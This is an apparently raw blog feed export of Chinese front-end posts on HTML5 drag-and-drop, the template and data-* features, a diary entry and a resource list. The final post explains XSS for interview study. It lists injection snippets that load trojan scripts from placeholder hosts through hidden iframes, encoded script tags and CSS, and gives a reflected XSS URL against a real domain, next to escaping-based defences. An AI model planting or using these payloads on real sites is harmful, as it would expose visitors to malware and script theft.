<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>拖(drag)放(drop)，我们就围绕这两个字扩展。</p>
<p>1.首先要允许拖元素。</p>
<pre><code>&lt;div draggable=&quot;true&quot;&gt;&lt;/div&gt;
</code></pre><p>2.允许传送数据</p>
<pre><code>&lt;div id=&quot;drag&quot; draggable=&quot;true&quot; ondragstart=&quot;drag(event)&quot; &gt;&lt;/div&gt;
</code></pre><p>3.定义放置的位置</p>
<pre><code>&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;
</code></pre><a id="more"></a>
<p>4.接受数据</p>
<pre><code>&lt;div id=&quot;container&quot; ondragover=&quot;dragover(event)&quot; ondrop=&quot;drop(event)&quot;&gt;&lt;/div&gt; 
//js目标元素中保存数据 
ev.target.appendChild(document.getElementById(data));
</code></pre><p>5.阻止本身事件<br>drop 事件的默认行为是以链接形式打开，则调用 preventDefault() 来避免浏览器对数据的默认处理。</p>
<pre><code>ev.preventDefault();    
</code></pre><h4 id="涉及事件"><a href="#涉及事件" class="headerlink" title="涉及事件"></a>涉及事件</h4><ul>
<li><p>被拖动的元素发生顺序<br>  dragstart–&gt;drag[持续发生]–dragend</p>
<ul>
<li>dragstart:<b>拖动什么</b><br>  按下鼠标键并开始移动鼠标时，会在被拖放的元素上触发dragstart事件。但会出现一个有斜线的圆，表示不能将元素放置在现在的位置上。</li>
<li>drag:<b>进行放置</b><br>  触发dragstart事件后，便触发。而且一直持续发生。</li>
<li>dragover<br>  拖动停止时,即鼠标空开，即使元素没有移动。</li>
</ul>
</li>
<li><p>元素拖动到放置的位置发生顺序<br>  dragenter–&gt;dragover[持续发生]–&gt;dragleave或drop</p>
<ul>
<li>dragenter:只要元素被拖动到放置目标上，就会触发dragenter事件</li>
<li>dragover:<b>放到何处</b>，如果被拖动的元素在放置目标的范围内移动时，就会持续触发该事件。若不在目标元素内，则停止该事件。但会触发dragleave事件。</li>
<li>dragleave：元素离开目标元素时触发。</li>
</ul>
</li>
</ul>
<h2 id="dataTransfer对象"><a href="#dataTransfer对象" class="headerlink" title="dataTransfer对象"></a>dataTransfer对象</h2><p>为了在拖放操作时实现数据交换，IE 5引入了dataTransfer对象，它是事件对象的一个属性，用于从被拖动元素向放置目标传递<b>字符串格式</b>的数据。</p>
<p>####访问器与修改器<br>期间允许指定各种MIME类型。如“Text”与“URL”,但是会被映射为“text/plain”和“text/uri-list”。</p>
<ul>
<li>setData()</li>
</ul>
<pre><code>event.dataTransfer.setData(&quot;Text&quot;, &quot;some text&quot;);
event.dataTransfer.setData(&quot;URL&quot;, &quot;HTML://www.w3cmm.com/&quot;);
</code></pre><ul>
<li>getData()</li>
</ul>
<pre><code>//获取文本数据
var dataTransfer = event.dataTransfer;
//读取URL
var url = dataTransfer.getData(&quot;url&quot;) || dataTransfer.getData(&quot;text/uri-list&quot;);
//读取文本
var text = edataTransfer.getData(&quot;Text&quot;);
</code></pre><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>链接地址：<a href="http://htmlpreview.github.io/?https://github.com/WangXiZhu/Learning_Demo/blob/master/html5_draggable/index.html" target="_blank" rel="external">请戳这里</a></p>
<p>学习地址：<a href="http://www.w3cmm.com/html/drag.html" target="_blank" rel="external">http://www.w3cmm.com/html/drag.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;昨天去百度面试了，妥妥的接受了一波打击。再一次证明自己的基础是相当的不牢固，而且以前学习知识也有点浅尝辄止的感觉。学了新的东西就沾沾自喜，而现在一定要静下心来学习，多多发散思维。&lt;/p&gt;
&lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h2&gt;&lt;p&gt;拖(drag)放(drop)，我们就围绕这两个字扩展。&lt;/p&gt;
&lt;p&gt;1.首先要允许拖元素。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div draggable=&amp;quot;true&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.允许传送数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;drag&amp;quot; draggable=&amp;quot;true&amp;quot; ondragstart=&amp;quot;drag(event)&amp;quot; &amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.定义放置的位置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;container&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="html5" scheme="http://blog.zchub.cn/tags/html5/"/>
    
      <category term="百度面试" scheme="http://blog.zchub.cn/tags/%E7%99%BE%E5%BA%A6%E9%9D%A2%E8%AF%95/"/>
    
      <category term="drop" scheme="http://blog.zchub.cn/tags/drop/"/>
    
      <category term="drag" scheme="http://blog.zchub.cn/tags/drag/"/>
    
  </entry>
  
  <entry>
    <title>dairy-2015-09-13</title>
    <link href="http://blog.zchub.cn/2015/09/14/dairy-2015-09-13/"/>
    <id>http://blog.zchub.cn/2015/09/14/dairy-2015-09-13/</id>
    <published>2015-09-14T00:05:01.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="日记一则"><a href="#日记一则" class="headerlink" title="日记一则"></a>日记一则</h2><p>今天又来吹哈夸夸。</p>
<p>来了成都将近一个星期了。和“室友们”住在一起挺开心的。每天大家一起吃饭，睡觉（不要乱想哟!）,看书。说实话，<br>大家的压力都挺大，都是带着满满的希望来到这个看着熟悉又陌生的城市渴望找到一个实习的机会。</p>
<p>来到这里，我现在比较遗憾的是有很长一段时间内没有写博客。而今天又和“室友们”一起和另外一波“工作小分队”聚了一下餐，其实是去蹭了一顿饭，在这里谢谢小伙伴的热情款待，我非常喜欢大家在一起的感觉，大家都谈了谈最近发生的事情，一起看火热的谍战片《伪装者》(其实我不是很爱好，比较费脑)。当然同时都抱怨了一下最近的笔试情况。虽然都不是很乐观，可大家心中都明白自己都要加把油。</p>
<p>下面，说说自己的情况吧！</p>
<p>还是和一个月前一样，复习知识，看看书。累了，听听音乐，说说段子。接下来，就是要面对美团的面试，我深深知道自己还没有准备好。但是我会尽自己最大的努力来补充自己的知识，毕竟还是以前欠下的帐，现在需要我自己来还，:(。ok，准备睡觉觉了！</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;日记一则&quot;&gt;&lt;a href=&quot;#日记一则&quot; class=&quot;headerlink&quot; title=&quot;日记一则&quot;&gt;&lt;/a&gt;日记一则&lt;/h2&gt;&lt;p&gt;今天又来吹哈夸夸。&lt;/p&gt;
&lt;p&gt;来了成都将近一个星期了。和“室友们”住在一起挺开心的。每天大家一起吃饭，睡觉（不要乱想哟!
    
    </summary>
    
      <category term="生活日记" scheme="http://blog.zchub.cn/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="dairy" scheme="http://blog.zchub.cn/tags/dairy/"/>
    
  </entry>
  
  <entry>
    <title>前端网站及资源分享</title>
    <link href="http://blog.zchub.cn/2015/09/05/front-end-site-share/"/>
    <id>http://blog.zchub.cn/2015/09/05/front-end-site-share/</id>
    <published>2015-09-05T01:28:56.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<p>##说点废话[凑字数]<br>最近是在忙着准备找工作，每天也感觉自己忙得够呛。有时候甚至很晚才睡，很早就起了(对于我来说，嘻嘻！)。看了javascript也有一段时间了，可是感觉自己还是有点迷糊糊的。之前有看了阮一峰老师的一篇文章，不过存在很大的争议(附：不过我看了之后，还是觉得很有意思。可能有些概念自己也不知道，就当学习了)。</p>
<p>所以我觉得学习好的东西是非常有必要的，这样可以让自己少走一点弯路。而自己这一段时间，也收藏了不少的文章和网站(估计是浏览器中分页太少了)，我觉得需要总结一下。</p>
<p>##国外<br>首先还是说说歪果仁的！(毕竟这些玩意很多是人家的)</p>
<ul>
<li><a href="http://stackoverflow.com/" target="_blank" rel="external">stackoverflow</a><br>这应该是大家熟知的，社区非常活跃，里面的人们都很有分析的精神。<br>Pi:上次我有个问题，就是在这个上面找到答案的！而且自己还到CSDN上装了一次逼！</li>
</ul>
<a id="more"></a>
<ul>
<li><p><a href="http://github.com/" target="_blank" rel="external">github</a><br>托管网站，仓库。可以放300M的东东，好爽！(顿时觉得做程序员是幸福的,这么多免费的)，自己的博客，日记都可以放在上面。而且最好的是上面的东西是开源，可以向别人学习或进一步地合作。</p>
<ul>
<li><a href="http://segmentfault.com/a/1190000002804472" target="_blank" rel="external">github上值得关注的前端项目</a><br>资源多多的！</li>
<li><a href="https://github.com/wangxizhu" target="_blank" rel="external">自己fork的项目</a></li>
<li><a href="http://bonsaiden.github.io/JavaScript-Garden/zh/" target="_blank" rel="external">JavaScript秘密花园</a></li>
</ul>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript" target="_blank" rel="external">MDN</a><br>Mozilla Foundation，Mozilla基金会我觉得这个挺厉害的。上面的内容应有尽有。而且自己还可以参与这个社区中进行翻译。(pi:自己之前上去翻译过几百字，觉得可能会误人子弟，就觉着先多看看书，再继续闯荡江湖！)</p>
</li>
<li><p><a href="https://msdn.microsoft.com/zh-cn/library/" target="_blank" rel="external">MicroSoft</a><br>微软的，自己没怎么用过。</p>
</li>
<li><p><a href="http://www.w3.org/TR/" target="_blank" rel="external">W3C</a><br>标准，没得话说！</p>
</li>
<li><p><a href="http://jsrocks.org/" target="_blank" rel="external">jsrocks</a><br>好像@hacke2龙哥之前翻译的文章就是这个网站的。</p>
</li>
</ul>
<p>##国内的</p>
<ul>
<li><p><a href="http://www.w3cfuns.com/" target="_blank" rel="external">w3cfuns</a><br>前端必备良站，牛人多多。</p>
</li>
<li><p><a href="http://www.html-js.com/" target="_blank" rel="external">前端乱炖</a><br>也不知道会炖成什么样，访问不是很多。不过是以前学姐推荐的。</p>
</li>
<li><p><a href="http://www.csdn.net/" target="_blank" rel="external">csdn</a><br>自己写点小东西最早在这上面，有社区提供支持。还可以下载很多资源。</p>
</li>
<li><p><a href="http://segmentfault.com/" target="_blank" rel="external">segmentfault</a><br>感觉很像国外的stackoverflow</p>
</li>
</ul>
<ul>
<li><a href="http://code.ciaoca.com/" target="_blank" rel="external">前端开发仓库</a><br>有一些小东西，还比较好耍。</li>
</ul>
<ul>
<li><p><a href="http://www.zhangxinxu.com/" target="_blank" rel="external">张鑫旭</a><br>比较geek,特别喜欢钻研。实干人物。</p>
</li>
<li><p><a href="http://www.cnblogs.com/TomXu/" target="_blank" rel="external">汤姆大叔</a><br>既会技术，又有管理能力。很是佩服。</p>
</li>
<li><p><a href="ruanyifeng.com">阮一峰</a><br>非程序员，我认为却超过程序员。真正的勇士，希望在阮老师的身上多学习点品质。</p>
</li>
<li><p><a href="http://code.csdn.net/news/2821086" target="_blank" rel="external">github牛人</a><br>今天仔细看了看，确实都是非凡的人物。也给了自己很多动力。特别是有的不但技术顶尖，而且精神生活也特别丰富。</p>
</li>
</ul>
<p>##IT公司团队</p>
<p>首先当然是BAT咯</p>
<ul>
<li><p><a href="http://ued.taobao.org/" target="_blank" rel="external">阿里淘宝</a><br>作为“马帝国”旗下的大将，能文能武。</p>
</li>
<li><p><a href="http://efe.baidu.com/" target="_blank" rel="external">百度efe</a><br>内容丰富，技术全面，不可多得</p>
</li>
<li><p><a href="http://fex.baidu.com/" target="_blank" rel="external">百度Web 前端研发部</a><br>看了之后，发现自己的弱小，真心想未来能成为其中的一员，与他们煮茶论道。</p>
</li>
<li><p><a href="http://www.alloyteam.com/" target="_blank" rel="external">腾讯全端 AlloyTeam 团队</a><br>人家的口号就是“成为地球卓越的Web团队”，这可不是说着玩的。真实力！前端可以多学习。</p>
</li>
<li><p><a href="http://qqfe.org/" target="_blank" rel="external">腾讯网前端团队</a><br>技术的内容不是很多。</p>
</li>
<li><p><a href="http://isux.tencent.com/" target="_blank" rel="external">腾讯ISUX</a><br>这个了不起，页面非常地炫，可以学习很多东西。</p>
</li>
<li><p><a href="http://www.75team.com/" target="_blank" rel="external">360奇舞团</a><br>更新的内容也不是很多。</p>
</li>
</ul>
<p>##其他</p>
<ul>
<li><p><a href="http://www.zhihu.com/" target="_blank" rel="external">知乎</a><br>可以在上面发表自己的观点。吐个槽什么的。</p>
</li>
<li><p><a href="https://github.com/h5bp/Front-end-Developer-Interview-Questions" target="_blank" rel="external">前端面试题</a><br>这个还是很有必要的。</p>
</li>
<li><p><a href="http://pan.baidu.com/s/1jGhGikY" target="_blank" rel="external">前端书籍集合</a><br>之前从同学那里保存下来的，觉得会有很用处。提取码：h862</p>
</li>
</ul>
<p>下面这些是自己用过或者是觉得还不错的小玩意。</p>
<ul>
<li><p><a href="http://www.tuicool.com/articles/buaQjy" target="_blank" rel="external">nodePPT</a><br>做出来的ppt,真的是狂拽炫酷吊炸天。</p>
</li>
<li><p><a href="http://www.webhek.com/css-preprocessor" target="_blank" rel="external">webhek</a><br>小的应用，真的会点亮你的眼睛。</p>
</li>
<li><p><a href="http://mahua.jser.me/" target="_blank" rel="external">在线markdown编辑器</a><br>现在正在使用，你懂的。</p>
</li>
</ul>
<p>##总结<br>真心觉得自己撒也不会，就保存了一大堆的网站啊，或者其他资源。。。悲剧啊！<br>不过我还是希望向前面的人看齐，做一个有道德，有理想，有文化，有内涵的程序猿。哦，有的好的资源，会继续更新的，不过也欢迎大家补充，么么哒！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;##说点废话[凑字数]&lt;br&gt;最近是在忙着准备找工作，每天也感觉自己忙得够呛。有时候甚至很晚才睡，很早就起了(对于我来说，嘻嘻！)。看了javascript也有一段时间了，可是感觉自己还是有点迷糊糊的。之前有看了阮一峰老师的一篇文章，不过存在很大的争议(附：不过我看了之后，还是觉得很有意思。可能有些概念自己也不知道，就当学习了)。&lt;/p&gt;
&lt;p&gt;所以我觉得学习好的东西是非常有必要的，这样可以让自己少走一点弯路。而自己这一段时间，也收藏了不少的文章和网站(估计是浏览器中分页太少了)，我觉得需要总结一下。&lt;/p&gt;
&lt;p&gt;##国外&lt;br&gt;首先还是说说歪果仁的！(毕竟这些玩意很多是人家的)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/&quot;&gt;stackoverflow&lt;/a&gt;&lt;br&gt;这应该是大家熟知的，社区非常活跃，里面的人们都很有分析的精神。&lt;br&gt;Pi:上次我有个问题，就是在这个上面找到答案的！而且自己还到CSDN上装了一次逼！&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://blog.zchub.cn/tags/front-end/"/>
    
      <category term="扯淡" scheme="http://blog.zchub.cn/tags/%E6%89%AF%E6%B7%A1/"/>
    
  </entry>
  
  <entry>
    <title>html5新标签data-*与template</title>
    <link href="http://blog.zchub.cn/2015/09/04/html5-data-template/"/>
    <id>http://blog.zchub.cn/2015/09/04/html5-data-template/</id>
    <published>2015-09-04T21:00:10.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先这篇文章是由于看到 “script” 标签中引用了html内容，觉得甚是奇怪。在之前模模糊糊的印象中见过，但是但是也没有在意。不过今天在看微店[感觉又在打广告]的招聘网站的是否又看到了这个使用的方法，我觉得有必要学习一下。</p>
<p>####举个栗子</p>
<pre><code>&lt;script type=&quot;text/template&quot;  id=&quot;test&quot;&gt;
    &lt;div class=&quot;title register&quot;&gt;
        &lt;h1&gt;姓名:&lt;/h1&gt;
        &lt;h2&gt;年龄:&lt;/h2&gt;
    &lt;/div&gt;
&lt;/script&gt;
</code></pre><a id="more"></a>
<h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><p>还是通过操作dom的形式来获取元素的内容</p>
<pre><code>var test = document.getElementById(&quot;test&quot;).innerHTML;
document.write(test);
</code></pre><p>####分析<br>由于script中的html代码不能直接显示，所以它在页面中的作用就相当于是模板(template)，不过我觉得在script脚本中来做这件事显得有点越俎代庖。那么有没有其他的方式呢？答案是有的。在html5中就有template标签，而它的作用就是这里说的模板。</p>
<h2 id="tml5的template"><a href="#tml5的template" class="headerlink" title="tml5的template"></a>tml5的template</h2><p>template是属于web components里面的规范。作用是可以将不必立即渲染的元素，不必立即执行的脚本放入这里。</p>
<h4 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h4><pre><code>&lt;script&gt;
 // 数据在这里是硬编码，但是也可以访问服务器获得数据
    var data = [
       { name: &apos;jack&apos;, age: 20, sex: &apos;Male&apos;},
       { name: &apos;rose&apos;, age: 19, sex: &apos;Female&apos;},
    ];
&lt;/script&gt;

&lt;table border=&quot;1&quot;&gt;
    &lt;thead&gt;     
        &lt;tr&gt;
               &lt;th&gt;姓名 &lt;th&gt;年龄 &lt;th&gt;性别
    &lt;/thead&gt;
    &lt;tbody&gt;
        &lt;template id=&quot;row&quot;&gt;
               &lt;tr&gt;&lt;td&gt;&lt;td&gt;&lt;td&gt;&lt;/tr&gt;
        &lt;/template&gt;
    &lt;/tbody&gt;
&lt;/table&gt;

&lt;script&gt;
    var template = document.querySelector(&apos;#row&apos;);
    for (var i = 0; i &lt; data.length; i += 1) {
       var person = data[i];
       var clone = template.content.cloneNode(true);
       var cells = clone.querySelectorAll(&apos;td&apos;);
       cells[0].textContent = person.name;
       cells[1].textContent = person.age;
       cells[2].textContent = person.sex;
       template.parentNode.appendChild(clone);
    }
&lt;/script&gt;
</code></pre><p>这里就是通过template标签来实现刚刚script中的功能，结果可谓是<b>完美！</b></p>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>以往可能我们也使用过其他的模板语言，如freemarker,或者就是我们常用的html文档。html文档中就可以通过include来引入其它的文件。而 template 同样也是可以的。</p>
<pre><code>&lt;template id=&quot;ulList&quot;&gt;
  &lt;li&gt;
    &lt;strong&gt;&lt;%=content%&gt;&lt;/strong&gt;
    &lt;template&gt;
      &lt;div&gt;
        &lt;p&gt;&lt;%=detail%&gt;&lt;/p&gt;
      &lt;/div&gt;
    &lt;/template&gt;            
  &lt;/li&gt;
&lt;/template&gt;
</code></pre><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><pre><code>//通常获取内容方法
var clone = document.getElementById(&quot;row&quot;).content；

//实际上
var clone = template.content.cloneNode(true);
</code></pre><p>如果我们直接将内容 appendChild 到 DOM 树中，documentFragment 内的内容就会被清空。因为 template 标签内容就是一个 documentFragment 的 shadowDOM，所以应该使用 cloneNode 或者 importNode 方法将内容复制到 DOM 中，这样才能保证这个 shadowDOM 内容不被清空。</p>
<h2 id="html5的data"><a href="#html5的data" class="headerlink" title="html5的data-*"></a>html5的data-*</h2><p>在模板利用扩展之后，我又想起了之前看过的同样是html5标签的data-。</p>
<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>存储页面或应用程序的私有自定义数据。同时存储的（自定义）数据能够被页面的 JavaScript 中利用，以创建更好的用户体验（不进行 Ajax 调用或服务器端数据库查询）。</p>
<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><pre><code>属性名=&quot;属性值&quot;  ==&gt;  data-name=&quot;value&quot;
</code></pre><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><pre><code>&lt;span data-my-name=&quot;tony&quot; data-age=&quot;20&quot; id=&quot;info&quot;&gt;&lt;/span&gt;

&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;
&lt;h2 id=&quot;age&quot;&gt;&lt;/h2&gt;
&lt;script&gt;
    var info = document.getElementById(&quot;info&quot;);
    document.getElementById(&quot;name&quot;).innerHTML = info.dataset.myName;
    document.getElementById(&quot;age&quot;).innerHTML = info.dataset.age;
&lt;/script&gt;
</code></pre><p>是不是显得非常地多余。但是我们可以定义多种数据，有的情况下需要，有时不需要，那么我们就可以通过script操作来实现。</p>
<h4 id="data-在script中如何使用"><a href="#data-在script中如何使用" class="headerlink" title="data-*在script中如何使用"></a>data-*在script中如何使用</h4><p>1.getAttribute与setAttribute存取dataset</p>
<pre><code>var name = document.getElementById(&quot;info&quot;).getAttribute(&quot;data-my-name&quot;);
</code></pre><p>2.通过Dataset</p>
<p>返回一个集合</p>
<pre><code>var dataset = document.getElementById(&quot;info&quot;).dataset;
</code></pre><p>某个具体数据</p>
<p>data-name 的data就可以直接省略，但是name的内容必须以驼峰式来进行命名。如data-git-hub就直接转为gitHub。</p>
<pre><code>var name = document.getElementById(&quot;info&quot;).dataset.myName;    
</code></pre><p>3.使用了jquery</p>
<p>jquery中获取该属性值可以通过 $.data() 的方式,以及 $.attr(),但是推荐 $.attr()的方式更加准确。</p>
<h4 id="data-浏览器支持情况"><a href="#data-浏览器支持情况" class="headerlink" title="data-*浏览器支持情况"></a>data-*浏览器支持情况</h4><p>HTML5 Data属性的支持情况在IE上很糟糕。</p>
<p><a href="http://caniuse.com/#search=data-*" target="_blank" rel="external">http://caniuse.com/#search=data-*</a></p>
<ul>
<li>Internet Explorer: 11+</li>
<li>Chrome: 8+</li>
<li>Firefox: 6+</li>
<li>Opera: 11.1+</li>
<li>Safari: 6+</li>
<li>Android Browser: 4+</li>
</ul>
<p>学习网站：<br><a href="http://www.w3.org/TR/html5/scripting-1.html#the-template-element" target="_blank" rel="external">http://www.w3.org/TR/html5/scripting-1.html#the-template-element</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;首先这篇文章是由于看到 “script” 标签中引用了html内容，觉得甚是奇怪。在之前模模糊糊的印象中见过，但是但是也没有在意。不过今天在看微店[感觉又在打广告]的招聘网站的是否又看到了这个使用的方法，我觉得有必要学习一下。&lt;/p&gt;
&lt;p&gt;####举个栗子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&amp;quot;text/template&amp;quot;  id=&amp;quot;test&amp;quot;&amp;gt;
    &amp;lt;div class=&amp;quot;title register&amp;quot;&amp;gt;
        &amp;lt;h1&amp;gt;姓名:&amp;lt;/h1&amp;gt;
        &amp;lt;h2&amp;gt;年龄:&amp;lt;/h2&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="html5" scheme="http://blog.zchub.cn/tags/html5/"/>
    
      <category term="template" scheme="http://blog.zchub.cn/tags/template/"/>
    
  </entry>
  
  <entry>
    <title>front-end-security-xss</title>
    <link href="http://blog.zchub.cn/2015/09/02/front-end-security-xss/"/>
    <id>http://blog.zchub.cn/2015/09/02/front-end-security-xss/</id>
    <published>2015-09-02T21:25:28.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>没想到这样一个问题，还把自己搞得有点昏了。不过在找寻答案的过程中，我知道自己是快乐的！虽然没有自己解答出这个问题，但是收获颇多。特别是看了人家一步一步思考问题的方式，感悟是大大的。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>xss作为web前端常用的注入漏洞，在现在的互联网业务中其危险性不亚于其他攻击方式，请编写过滤函数<br>1.通过异步请求拿到的json数据后，如何安全的使用innerHtml显示在页面上<br>2.浏览器地址栏直接获取的参数，如何安全地进行document.write<br>3.后台直接输出完整的html页面，如何保证页面渲染后，用户内容的&lt; script &gt;不被执行.</p>
<a id="more"></a>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里提出的就是xxs方式，那么这3个小题中的innerHtml,document.write,script肯定就是“坑”了。</p>
<h2 id="前端常见xss"><a href="#前端常见xss" class="headerlink" title="前端常见xss"></a>前端常见xss</h2><p>1.iframe: </p>
<pre><code>document.write(&quot;&lt;iframe width=&apos;0&apos; height=&apos;0&apos; src=&apos;地址&apos;&gt;&lt;/iframe&gt;&quot;);     //保存为xxx.js
</code></pre><p>则JS代码为:</p>
<pre><code>&lt;script  src=&apos;xxx.js&apos;&gt;&lt;/script&gt; 
</code></pre><p>2.js变形加密</p>
<pre><code>&lt;script language=&quot;JScript.Encode&quot; src=http://www.xxx.com/muma.txt&gt;&lt;/script&gt; //muma.txt 可改成任意后缀
</code></pre><p>3.flash</p>
<pre><code>http://网页木马地址 插入木马地址 width=10 height=10&quot;, &quot;GET&quot; 宽度和高度，方式后面的照添，更改木马地址就可以了。
</code></pre><p>4.隐蔽方式：</p>
<pre><code>top.document.body.innerHTML=top.document.body.innerHTML+&apos;\r\n&lt;iframe src=&quot;http://www.xxx.com/muma.htm/&quot;&gt;&lt;/iframe&gt;&apos;[/url]
</code></pre><p>5.css中xss：</p>
<pre><code>body {background-image:url(&apos;javascript:document.write(&quot;&lt;script src=http://www.XXX.net/muma.js&gt;&lt;/script&gt;&quot;)&apos;)}
</code></pre><p>6.图片伪装：</p>
<pre><code>&lt;html&gt; 
    &lt;iframe src=&quot;网马地址&quot; height=0 width=0&gt;&lt;/iframe&gt; 
    &lt;img src=&quot;图片地址&quot;&gt;&lt;/center&gt; 
&lt;/html&gt;
</code></pre><p>7.伪装调用：</p>
<pre><code>&lt;frameset rows=&quot;444,0&quot; cols=&quot;*&quot;&gt; 
&lt;frame src=&quot;打开网页&quot; framborder=&quot;no&quot; scrolling=&quot;auto&quot; noresize marginwidth=&quot;0&quot; margingheight=&quot;0&quot;&gt; 
&lt;frame src=&quot;网马地址&quot; frameborder=&quot;no&quot; scrolling=&quot;no&quot; noresize marginwidth=&quot;0&quot; margingheight=&quot;0&quot;&gt;
</code></pre><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>xss(cross site script)跨站脚本攻击<br>通过属性”src”加载来执行代码在获取网站或者网站服务器的部分或者全部权限后，在网页文件中插入一段恶意代码，<br>来实现攻击。</p>
<h2 id="xss类型"><a href="#xss类型" class="headerlink" title="xss类型"></a>xss类型</h2><p>这个是在阿里面试的时候问道这个问题的，但是之前并没有很详细地区分xss的类型。只知道某种方式。</p>
<p>1.DOM—based XSS</p>
<p>该漏洞是基于文档对象模型Document Objeet Model,DOM)触发的。</p>
<pre><code>&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;

//javascript
var text = document.getElementById(&quot;print&quot;);
print.innerHTML = text.value;
</code></pre><p>解决方式：</p>
<ul>
<li><p>编码方式</p>
<pre><code>//将要转换的字符串设置为这个元素的innerText(ie支持)或者textContent(火狐，google支持)
(temp.textContent != undefined ) ? (temp.textContent = html) : (temp.innerText = html);

//返回这个元素的innerHTML，即得到经过HTML编码转换的字符串了
var output = temp.innerHTML;
</code></pre></li>
</ul>
<ul>
<li><p>解码方式</p>
<pre><code>//将要转换的字符串设置为这个元素的innerHTML(ie，火狐，google都支持)
temp.innerHTML = text;

//返回这个元素的innerText(ie支持)或者textContent(火狐，google支持)，即得到经过HTML解码的字符串了。
var output = temp.innerText || temp.textContent;
</code></pre></li>
</ul>
<p>2.存储型xss</p>
<p>即通常我们在录入数据时通过闭合标签的方式把数据存储到数据库中，再次显示的时候触发。</p>
<p>解决方式：转义标签</p>
<pre><code>如：
    &lt;  转义为  &amp;lt； 
    &gt;  转义为  &amp;gt； 
</code></pre><p>3.反射型xss</p>
<p>仍然来自于直接的用户输入，是在通过url控制了页面的输出（处理：转义字符）根据浏览器去bypass各种过滤，易用性稍微差一些。但最后在页面中显示出来，并需要用户自己去点击链接才能触发XSS的是反射型XSS。</p>
<pre><code>如：

    http://www.jpl.nasa.gov/about_JPL /maps.cfm?departure=lax%22 %3Cimg%20src=k.png%20onerror=alert(%22XSSed%20by%20sH%22)%20/%3E
</code></pre><p>##MutationEvent何许<br>HTML5中添加，提供主动防御</p>
<p>文章参考：<a href="http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-2/" target="_blank" rel="external">http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-2/</a></p>
<h2 id="javascript-hook"><a href="#javascript-hook" class="headerlink" title="javascript hook"></a>javascript hook</h2><p>简单钩子实现    </p>
<pre><code>//暂存变量
&lt;script&gt;
    var zc = Document.prototype.createElement;

    Document.prototype.createElement = function() {

        // 调用原生函数
        var element = zc.apply(this, arguments);

        // 为脚本元素安装属性钩子
        if (element.tagName == &apos;SCRIPT&apos;) {
            element.__defineSetter__(&apos;src&apos;, function(url) {
                console.log(&apos;设置路径:&apos;, url);
            });
        }

        // 返回元素实例
        return element;
    };
&lt;/script&gt;
</code></pre><p>测试钩子</p>
<pre><code>&lt;button id=&quot;btn&quot;&gt;创建脚本&lt;/button&gt;
&lt;script&gt;
    btn.onclick = function() {
        var el = document.createElement(&apos;script&apos;);
        el.src = &apos;http://www.etherdream.com/xss/out.js?dynamic&apos;;
        document.body.appendChild(el);
    };
&lt;/script&gt;
